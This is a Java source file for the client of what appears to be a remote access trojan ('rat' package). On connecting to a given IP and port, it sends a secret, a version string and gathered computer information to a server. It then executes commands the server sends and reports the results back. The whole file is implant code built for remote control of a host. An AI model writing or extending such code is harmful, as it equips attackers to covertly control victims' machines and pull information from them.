package main.java.rat.client;

import main.java.Main;
import main.java.rat.Environment;
import main.java.rat.command.ClientCommand;
import main.java.rat.handlers.InputOutputHandler;
import main.java.rat.logger.StringLogger;
import main.java.rat.models.ComputerInfo;
import main.java.rat.models.SocketMessage;
import main.java.rat.models.StringSocketMessage;
import main.java.rat.server.CommandHandler;


public class RATClient extends AbstractSocketClient implements Environment {

    private CommandHandler commandHandler;

    public RATClient(String ip, int port) {
        super(ip, port);


        commandHandler = new CommandHandler(
                this::logToServer,
                this,
                ClientCommand.getAllClientCommands()
        );
    }

    @Override
    void connectedClient(InputOutputHandler handler) {
        this.handleInitHandshake();
    }

    private void handleInitHandshake() {
        this.inputOutputHandler.sendMessage(Main.SECRET);
        this.inputOutputHandler.sendMessage(Main.VERSION);
        this.inputOutputHandler.sendMessage(ComputerInfo.create());
    }


    @Override
    public void disconnected() {

    }

    @Override
    public void receivedMessage(Object rawMessage) {
        SocketMessage message = (SocketMessage) rawMessage;
        parseSocketMessage(message);
    }

    private void parseSocketMessage(SocketMessage message) {
        if(message.isCommand() && message instanceof StringSocketMessage) {
            commandHandler.handleCommand((String) message.getContent());
        }
    }

    void logToServer(String message) {
        StringSocketMessage infoMessage = new StringSocketMessage();
        infoMessage.setIsInfo();
        infoMessage.setContent(message);

        sendMessage(infoMessage);
    }

    public void sendMessage(SocketMessage message) {
        this.inputOutputHandler.sendMessage(message);
    }

    @Override
    public boolean isServer() {
        return false;
    }

    @Override
    public boolean isClient() {
        return true;
    }
}
